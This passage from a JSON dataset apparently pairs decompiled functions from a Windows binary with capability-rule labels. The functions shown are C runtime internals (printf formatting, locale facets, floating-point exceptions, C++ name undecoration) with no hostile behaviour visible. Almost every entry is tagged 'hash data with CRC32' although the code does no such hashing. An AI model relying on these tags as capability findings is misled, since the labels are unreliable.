CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049e86d;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e86d:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405df8(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404a7f(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1705
    },
    "004029dc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004029dc(uint arg_8h)\n\n{\n    int32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56af98, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = lpCriticalSection;\n    if (lpCriticalSection == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n    }\n    else {\n        if ((*(lpCriticalSection + 0xc) >> 0xc & 1) == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n            fcn.004013f7(lpCriticalSection);\n            *(unaff_EBP + -4) = 0;\n            uVar2 = fcn.004044d0(lpCriticalSection);\n            *(unaff_EBP + -0x1c) = uVar2;\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004ada84();\n            goto code_r0x004ada71;\n        }\n        fcn.00406532(lpCriticalSection);\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004ada71:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 381
    },
    "004601ec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004601ec(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.0040588f();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00402ce3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402ce3(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(arg_8h * 8 + 0x54e848);\n    iVar2 = *(arg_8h * 8 + 0x54e84c);\n    if ((~*0x56f460 & 1) == 0) {\n        iVar1 = iVar1 + 2;\n        iVar2 = iVar2 + -2;\n    }\n    return CONCAT44(iVar2, iVar1);\n}\n",
        "token_count": 129
    },
    "00402e05": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402e05(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_44h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x38;\n    fcn.004030e9();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.004024b9(0x44, uVar4);\n        *(unaff_EBP + -0x10) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406541();\n            uVar4 = fcn.0040465b(uVar4);\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::ctype_wchar_t_.0;\n            fcn.00405439(uVar4);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fb4();\n        }\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 368
    },
    "00402e64": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402e64(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a2ec5;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a2ec5;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a2ec5:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404bb5(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.00402af9(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00405597(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1117
    },
    "0046026c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046026c(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4e2e60;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    *in_ECX = vtable.std::ios_base.0;\n    fcn.00406898(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 168
    },
    "00402f3b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402f3b(uint32_t arg_8h, double *arg_ch, uint32_t arg_10h)\n\n{\n    double dVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    float10 fVar8;\n    float10 fVar9;\n    uint32_t var_10h;\n    uint8_t var_ch;\n    uchar uStack15;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    uVar7 = arg_8h & 0x1f;\n    if (((arg_8h & 8) != 0) && ((arg_10h & 1) != 0)) {\n        fcn.00402342(1);\n        uVar7 = arg_8h & 0x17;\n        goto code_r0x004c12e8;\n    }\n    if ((arg_8h & arg_10h & 4) != 0) {\n        fcn.00402342(4);\n        uVar7 = arg_8h & 0x1b;\n        goto code_r0x004c12e8;\n    }\n    if (((arg_8h & 1) == 0) || ((arg_10h & 8) == 0)) {\n        if (((arg_8h & 2) != 0) && ((arg_10h & 0x10) != 0)) {\n            dVar2 = *arg_ch;\n            uVar7 = arg_8h >> 4 & 1;\n            if (dVar2 == 0.0) {\n                uVar7 = 1;\n            }\n            else {\n                fVar8 = fcn.00403a03(SUB84(dVar2, 0), dVar2 >> 0x20, &var_4h);\n                iVar4 = var_4h - 0x600;\n                dVar2 = fVar8;\n                var_10h = SUB84(dVar2, 0);\n                var_ch = dVar2 >> 0x20;\n                uStack15 = dVar2 >> 0x28;\n                var_ah._0_2_ = dVar2 >> 0x30;\n                fVar9 = 0;\n                if (iVar4 < -0x432) {\n                    fVar9 = fVar9 * fVar8;\n                    uVar7 = 1;\n                }\n                else {\n                    var_4h = ((fVar9 < fVar8) << 8 | (fVar9 == fVar8) << 0xe) == 0;\n                    var_ah._0_2_ = var_ah & 0xf | 0x10;\n                    if (iVar4 < -0x3fd) {\n                        iVar4 = -0x3fd - iVar4;\n                        uVar5 = dVar2 >> 0x20 & 0xfffff | 0x100000;\n                        do {\n                            if (((var_10h & 1) != 0) && (uVar7 == 0)) {\n                                uVar7 = 1;\n                            }\n                            var_10h = var_10h >> 1;\n                            if ((var_ch & 1) != 0) {\n                                var_10h = var_10h | 0x80000000;\n                            }\n                            uVar6 = uVar5 >> 1;\n                            var_ch = uVar6;\n                            uStack15 = uVar6 >> 8;\n                            var_ah._0_2_ = uVar5 >> 0x11;\n                            iVar4 = iVar4 + -1;\n                            uVar5 = uVar6;\n                        } while (iVar4 != 0);\n                    }\n                    fVar9 = CONCAT26(var_ah, CONCAT15(uStack15, CONCAT14(var_ch, var_10h)));\n                    if (var_4h != 0) {\n                        fVar9 = -fVar9;\n                    }\n                }\n                *arg_ch = fVar9;\n            }\n            if (uVar7 != 0) {\n                fcn.00402342(0x10);\n            }\n            uVar7 = arg_8h & 0x1d;\n        }\n        goto code_r0x004c12e8;\n    }\n    fcn.00402342(8);\n    uVar7 = arg_10h & 0xc00;\n    dVar2 = *0x552560;\n    dVar3 = *0x552560;\n    if (uVar7 == 0) {\n        dVar1 = *arg_ch;\njoined_r0x004c11bf:\n        if (dVar1 <= 0.0) {\n            dVar2 = -dVar3;\n        }\n        *arg_ch = dVar2;\n    }\n    else {\n        if (uVar7 == 0x400) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x552580;\n            goto joined_r0x004c11bf;\n        }\n        dVar3 = *0x552580;\n        if (uVar7 == 0x800) {\n            dVar1 = *arg_ch;\n            goto joined_r0x004c11bf;\n        }\n        if (uVar7 == 0xc00) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x552580;\n            goto joined_r0x004c11bf;\n        }\n    }\n    uVar7 = arg_8h & 0x1e;\ncode_r0x004c12e8:\n    if (((arg_8h & 0x10) != 0) && ((arg_10h & 0x20) != 0)) {\n        fcn.00402342(0x20);\n        uVar7 = uVar7 & 0xffffffef;\n    }\n    return uVar7 == 0;\n}\n",
        "token_count": 1324
    },
    "0046ba17": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ba17(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.004020fe();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00402f68": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402f68(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x0049f8ea:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0049f8ee:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f8f1:\n            cVar5 = fcn.004068a7(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f896:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f8f1;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x0049f8aa;\n                if (uVar7 < 0x45) goto code_r0x0049fa7a;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x0049fa7a;\n                    goto code_r0x0049f87e;\n                }\n            }\ncode_r0x0049f8fa:\n            cVar5 = fcn.00406730();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00406136();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x0049f8fa;\n            if (uVar7 != 99) goto code_r0x0049fa7a;\ncode_r0x0049f8aa:\n            cVar5 = fcn.0040101e(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00406640();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x0049f8fa;\n            if (uVar7 == 0x69) goto code_r0x0049f8ea;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.0040201d();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x0049fa7a;\n                cVar5 = fcn.004028ba();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x0049fa7a;\n                arg_ch_00 = 0;\n                goto code_r0x0049f896;\n            }\n            goto code_r0x0049f8ee;\n        }\ncode_r0x0049f87e:\n        cVar5 = fcn.00402d4c();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x0049fa7a;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0049f985;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f985:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00404043(&var_ch, arg_ch, param_1 + 0x18, param_1 + 0xc);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.00402fc7(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x0049fa7a:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1744
    },
    "00460241": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460241(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0046beb5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046beb5(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0046b9c2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b9c2(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 80
    },
    "0046233b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046233b(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "00403152": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_88h\n\nchar ** __cdecl fcn.00403152(char **arg_8h, char **arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    char **ppcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char **ppcVar9;\n    bool bVar10;\n    uint *var_88h;\n    uint *var_80h;\n    uint *var_78h;\n    char **var_70h;\n    uint var_68h;\n    int32_t var_60h;\n    char *var_5ch;\n    int32_t var_58h;\n    char *var_54h;\n    char *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    char *var_40h;\n    char *var_3ch;\n    char *var_38h;\n    char *var_34h;\n    char *var_30h;\n    uint var_2ch;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_60h = *0x56f458 - *0x56f45c;\n    ppcVar9 = NULL;\n    var_10h = NULL;\n    var_ch = NULL;\n    uVar1 = fcn.00401ca8();\n    if ((*arg_ch == NULL) || (var_58h = 1,  (arg_ch[1] & 0x200) == 0)) {\n        var_58h = 0;\n    }\n    if (uVar1 == 0xffff) {\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        *arg_8h = NULL;\n        return arg_8h;\n    }\n    if (uVar1 == 0xfffe) {\n        fcn.004012ad(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (uVar1 == 0xfffd) {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n        return arg_8h;\n    }\n    uVar8 = uVar1 & 0x8000;\n    var_24h = uVar8;\n    if (uVar8 == 0) {\ncode_r0x0048a860:\n        fcn.00402eb9(arg_ch);\n        uVar2 = var_24h;\n        if (uVar8 == 0) {\n            uVar8 = uVar1 & 0x7c00;\n            if ((uVar8 == 0x6800) || (uVar8 == 0x7000)) {\n                fcn.004049e4(arg_8h, &fcn.00403152::var_10h);\n                return arg_8h;\n            }\n            if (uVar8 == 0x6000) {\n                var_8h = var_10h;\n                var_34h = 0x54f4b0;\n                var_30h = 0x2;\n                var_4h = var_ch;\n                fcn.00403cba(0x7b);\n                fcn.00403535(&fcn.00403152::var_4ch, 0);\n                fcn.004052f9(&fcn.00403152::var_2ch, &fcn.00403152::var_4ch);\n                fcn.004050ba(arg_8h, &fcn.00403152::var_34h);\n                return arg_8h;\n            }\n        }\n        if ((uVar1 & 0xfc00) == 0x7c00) {\n            fcn.0040583f(arg_8h, &fcn.00403152::var_10h);\n            return arg_8h;\n        }\n        if (var_24h == 0) {\n            bVar10 = (uVar1 & 0x6000) == 0;\n        }\n        else {\n            bVar10 = (uVar1 & 0x1800) == 0x800;\n        }\n        uVar8 = uVar1 & 0x1800;\n        var_18h = uVar1 & 0x6000;\n        if (bVar10) {\n            uVar7 = uVar1 & 0x400;\n        }\n        else {\n            uVar7 = uVar1 & 0x1000;\n        }\n        var_20h = uVar1 & 0x1000;\n        var_24h = uVar1 & 0x400;\n        if ((uVar7 == 0) || ((uVar1 & 0x1b00) != 0x1000 || uVar2 == 0)) {\n            if (uVar2 == 0) {\n                bVar10 = var_18h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            uVar7 = var_24h;\n            if (!bVar10) {\n                uVar7 = var_20h;\n            }\n            if ((uVar7 != 0) && ((uVar1 & 0x1b00) == 0x1100 && uVar2 != 0)) {\n                var_8h = \"`template static data member constructor helper\\'\";\n                var_4h = 0x30;\n                goto code_r0x0048aa3b;\n            }\n            if (uVar2 == 0) {\n                bVar10 = var_18h == NULL;\n            }\n            else {\n                bVar10 = uVar8 == 0x800;\n            }\n            uVar7 = var_24h;\n            if (!bVar10) {\n                uVar7 = var_20h;\n            }\n            if ((uVar7 != 0) && ((uVar1 & 0x1b00) == 0x1200 && uVar2 != 0)) {\n                var_8h = \"`template static data member destructor helper\\'\";\n                var_4h = 0x2f;\n                goto code_r0x0048aa3b;\n            }\n            if (uVar2 != 0) goto code_r0x0048aa4b;\n            if ((uVar1 & 0x7c00) == 0x7800) goto code_r0x0048ae53;\ncode_r0x0048aac0:\n            bVar10 = var_18h == NULL;\n        }\n        else {\n            var_8h = \"`local static destructor helper\\'\";\n            var_4h = 0x20;\ncode_r0x0048aa3b:\n            fcn.00405c95(&fcn.00403152::var_8h);\n            if (uVar2 == 0) goto code_r0x0048aac0;\ncode_r0x0048aa4b:\n            bVar10 = uVar8 == 0x800;\n        }\n        uVar8 = var_24h;\n        if (!bVar10) {\n            uVar8 = var_20h;\n        }\n        if ((uVar8 == 0) || (((uVar1 & 0x1b00) != 0x1100 || uVar2 == 0 && ((uVar1 & 0x1b00) != 0x1200 || uVar2 == 0))))\n        {\n            ppcVar9 = fcn.0040171c(&fcn.00403152::var_2ch, &fcn.00403152::var_10h);\n        }\n        else {\n            ppcVar9 = fcn.00402e87(&fcn.00403152::var_2ch, 0x20, &fcn.00403152::var_10h);\n        }\n        var_10h = *ppcVar9;\n        var_ch = ppcVar9[1];\n        if (uVar2 != 0) goto code_r0x0048aae5;\n        bVar10 = (uVar1 & 0x6000) == 0;\n    }\n    else {\n        var_20h = uVar1 & 0x1800;\n        if (var_20h == 0x800) {\n            uVar2 = uVar1 & 0x400;\n        }\n        else {\n            uVar2 = uVar1 & 0x1000;\n        }\n        var_14h = uVar1 & 0x400;\n        var_40h = uVar1 & 0x1000;\n        if ((uVar2 != 0) && ((uVar1 & 0x1b00) == 0x1000)) goto code_r0x0048a860;\n        if (var_20h == 0x800) {\n            var_38h = var_14h;\n        }\n        else {\n            var_38h = var_40h;\n        }\n        if ((var_38h != NULL) && (((uVar1 & 0x1b00) == 0x1100 || ((uVar1 & 0x1b00) == 0x1200)))) goto code_r0x0048a860;\n        if ((uVar1 & 0x4000) != 0) {\n            if ((~((*0x56f460 >> 2 | *0x56f460) >> 1) & 1) == 0) {\n                uVar3 = fcn.004050f6(&fcn.00403152::var_8h);\n                fcn.004068e3(uVar3);\n            }\n            else {\n                uVar3 = fcn.004050f6(&fcn.00403152::var_8h);\n                ppcVar4 = fcn.00402e87(&fcn.00403152::var_34h, 0x20, uVar3);\n                var_10h = *ppcVar4;\n                var_ch = ppcVar4[1];\n            }\n        }\n        pcVar5 = var_14h;\n        var_38h = var_14h;\n        if (var_20h != 0x800) {\n            var_38h = var_40h;\n        }\n        if ((var_38h == NULL) || (var_20h != 0x1800)) {\n            var_34h = NULL;\n            var_30h = NULL;\n            var_8h = NULL;\n            var_4h = NULL;\n            var_54h = NULL;\n            var_50h = NULL;\n            var_38h = NULL;\n            var_14h = NULL;\n            var_4ch = 0;\n            var_48h = 0;\n            if (var_20h != 0x800) {\n                pcVar5 = var_40h;\n            }\n            uVar8 = uVar1 & 0x700;\n            if (pcVar5 != NULL) {\n                if (var_20h == 0x800) {\n                    if (uVar8 == 0x600) {\n                        var_70h = &fcn.00403152::var_1ch;\n                        fcn.00403535(var_70h, 1);\n                        var_34h = var_1ch;\n                        var_30h = var_18h;\n                        var_78h = &fcn.00403152::var_1ch;\n                        fcn.00403535(var_78h, 1);\n                        var_8h = var_1ch;\n                        var_4h = var_18h;\n                        var_80h = &fcn.00403152::var_1ch;\n                        fcn.00403535(var_80h, 1);\n                        var_54h = var_1ch;\n                        var_50h = var_18h;\n                    }\n                    else if (uVar8 == 0x500) {\n                        var_70h = &fcn.00403152::var_3ch;\n                        fcn.00403535(var_70h, 1);\n                        var_54h = var_3ch;\n                        var_50h = var_38h;\n                    }\n                }\n                var_70h = &fcn.00403152::var_1ch;\n                fcn.00403535(var_70h, 1);\n                var_38h = var_1ch;\n                var_14h = var_18h;\n            }\n            if ((var_20h == 0x800) && (uVar8 != 0x200)) {\n                if ((*0x56f460 & 0x60) == 0x60) {\n                    var_70h = 0x48a4fb;\n                    var_68h = fcn.004057a9(&fcn.00403152::var_1ch);\n                    var_70h = 0x48a505;\n                    fcn.004068e3(var_68h);\n                }\n                else {\n                    var_70h = 0x48a4e8;\n                    puVar6 = fcn.004057a9(&fcn.00403152::var_1ch);\n                    var_4ch = *puVar6;\n                    var_48h = puVar6[1];\n                }\n            }\n            if (((~(*0x56f460 >> 1) & 1) == 0) || ((~(*0x56f460 >> 4) & 1) == 0)) {\n                var_70h = 0x48a54a;\n                uVar3 = fcn.00403936(&fcn.00403152::var_1ch);\n                var_70h = 0x48a554;\n                